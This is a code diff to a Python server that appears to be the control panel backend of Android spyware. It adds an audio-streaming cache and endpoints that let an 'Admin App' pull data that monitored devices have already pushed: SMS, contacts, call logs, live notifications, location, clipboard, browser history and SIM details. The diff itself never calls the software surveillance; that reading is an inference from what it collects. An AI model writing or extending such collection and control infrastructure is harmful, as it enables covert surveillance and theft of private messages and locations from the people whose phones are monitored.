@@ -745,6 +745,16 @@ async def api_upload_base64(request: web.Request) -> web.Response:
                 "timestamp": time.time(),
                 "source": file_type,
             }
+        # Cache audio for the audio-streaming viewer — the admin app's
+        # StreamingActivity polls /api/stream/frame/{id}?type=audio and
+        # plays the latest chunk via MediaPlayer. We accept any base64
+        # upload with file_type=audio regardless of codec prefix.
+        elif file_type == 'audio':
+            store.latest_frames[f"{device_id}:audio"] = {
+                "data": base64_data,
+                "timestamp": time.time(),
+                "source": "audio",
+            }
         
         return json_response({
             "ok": True,
@@ -1213,6 +1223,175 @@ async def _wait_for_command_result(command_id: str, timeout: float = 15.0) -> Op
             return cmd.get('result', '')
         await asyncio.sleep(0.5)
     return None
+
+
+# ─── Stored Data API (read from Firebase RTDB) ────────────────
+#
+# These endpoints let the Admin App and Web Dashboard fetch the data
+# that devices have already pushed to Firebase (sms/contacts/calls/
+# notifications/location/device_info) WITHOUT having to send a fresh
+# command to the device. They are the read-side counterpart of the
+# device's /api/data/{device_id} write endpoint.
+
+# Allowed data types and their Firebase RTDB top-level paths.
+# NOTE: keep these in sync with firebase_client.store_* helpers.
+_ALLOWED_DATA_TYPES = {
+    'sms': 'sms',
+    'contacts': 'contacts',
+    'calls': 'calls',
+    'notifications': 'notifications',
+    'location': 'location',
+    'device_info': 'device_info',
+    'apps': 'apps',
+    'installed_apps': 'installed_apps',
+    'battery': 'battery',
+    'clipboard': 'clipboard',
+    'wifi_info': 'wifi_info',
+    'network_info': 'network_info',
+    'sim_info': 'sim_info',
+    'storage_info': 'storage_info',
+    'running_apps': 'running_apps',
+    'calendar': 'calendar',
+    'browser_history': 'browser_history',
+    'app_usage': 'app_usage',
+}
+
+
+async def api_web_get_data(request: web.Request) -> web.Response:
+    """Get stored data from Firebase RTDB for a device.
+
+    GET /api/web/data/{device_id}?type=sms
+
+    The Admin App calls this when the user picks "عرض البيانات الحالية"
+    (view current data) from the choice dialog shown for data commands.
+
+    Returns:
+      {"ok": true, "data": <firebase snapshot>, "type": "sms",
+       "device_id": "...", "fetched_at": <unix>}
+    """
+    session = get_auth_session(request)
+    if not session:
+        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+
+    device_id = request.match_info.get('device_id', '')
+    data_type = request.query.get('type', '').lower().strip()
+
+    if not device_id:
+        return json_response({"ok": False, "message": "Missing device_id"}, 400)
+    if not data_type:
+        return json_response({"ok": False, "message": "Missing type parameter"}, 400)
+    if data_type not in _ALLOWED_DATA_TYPES:
+        return json_response({
+            "ok": False,
+            "message": f"Invalid type '{data_type}'. Allowed: {', '.join(sorted(_ALLOWED_DATA_TYPES))}"
+        }, 400)
+
+    # Ownership check — admin sees all, regular user only their devices.
+    device = await store.get_user_device(session['user_id'], device_id)
+    if not device and session['role'] != 'admin':
+        return json_response({"ok": False, "message": "Device not found"}, 404)
+
+    # Read from Firebase RTDB at "<type>/<device_id>".
+    fb_path = f"{_ALLOWED_DATA_TYPES[data_type]}/{device_id}"
+    data = await _fb.get(fb_path)
+
+    return json_response({
+        "ok": True,
+        "data": data,
+        "type": data_type,
+        "device_id": device_id,
+        "fetched_at": time.time(),
+        "empty": data is None,
+    })
+
+
+async def api_web_get_notifications(request: web.Request) -> web.Response:
+    """Get notifications stored in Firebase for a device.
+
+    GET /api/web/notifications/{device_id}
+
+    The Admin App's NotificationsActivity polls this endpoint every 5
+    seconds to render the device's notification stream in real time.
+
+    Returns:
+      {"ok": true, "notifications": [...], "count": N,
+       "device_id": "...", "fetched_at": <unix>}
+    """
+    session = get_auth_session(request)
+    if not session:
+        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+
+    device_id = request.match_info.get('device_id', '')
+    if not device_id:
+        return json_response({"ok": False, "message": "Missing device_id"}, 400)
+
+    device = await store.get_user_device(session['user_id'], device_id)
+    if not device and session['role'] != 'admin':
+        return json_response({"ok": False, "message": "Device not found"}, 404)
+
+    raw = await _fb.get(f"notifications/{device_id}")
+
+    # Normalize to a list. The client app stores notifications as a list
+    # (store_notifications writes the whole list each time), so we usually
+    # get back a JSON array — but be defensive about object/dict shapes.
+    notif_list = []
+    if isinstance(raw, list):
+        notif_list = raw
+    elif isinstance(raw, dict):
+        # If it's a dict keyed by notification id, flatten to values.
+        for v in raw.values():
+            if isinstance(v, list):
+                notif_list.extend(v)
+            else:
+                notif_list.append(v)
+
+    # Sort by timestamp (descending) — newest first. Notifications carry
+    # either a numeric "timestamp" (ms) or a string "date" field.
+    def _ts(n):
+        if not isinstance(n, dict):
+            return 0
+        ts = n.get('timestamp') or n.get('time') or n.get('post_time')
+        if isinstance(ts, (int, float)):
+            return ts
+        if isinstance(ts, str):
+            try:
+                return float(ts)
+            except (ValueError, TypeError):
+                return 0
+        return 0
+
+    notif_list.sort(key=_ts, reverse=True)
+
+    return json_response({
+        "ok": True,
+        "notifications": notif_list,
+        "count": len(notif_list),
+        "device_id": device_id,
+        "fetched_at": time.time(),
+    })
+
+
+async def api_web_clear_notifications(request: web.Request) -> web.Response:
+    """Clear stored notifications for a device in Firebase RTDB.
+
+    DELETE /api/web/notifications/{device_id}
+
+    The Admin App's NotificationsActivity "clear" button calls this.
+    """
+    session = get_auth_session(request)
+    if not session:
+        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+
+    device_id = request.match_info.get('device_id', '')
+    if not device_id:
+        return json_response({"ok": False, "message": "Missing device_id"}, 400)
+
+    device = await store.get_user_device(session['user_id'], device_id)
+    if not device and session['role'] != 'admin':
+        return json_response({"ok": False, "message": "Device not found"}, 404)
+
+    ok = await _fb.set(f"notifications/{device_id}", None)
+    return json_response({"ok": ok, "device_id": device_id})
 
 
 async def api_web_list_files_device(request: web.Request) -> web.Response:
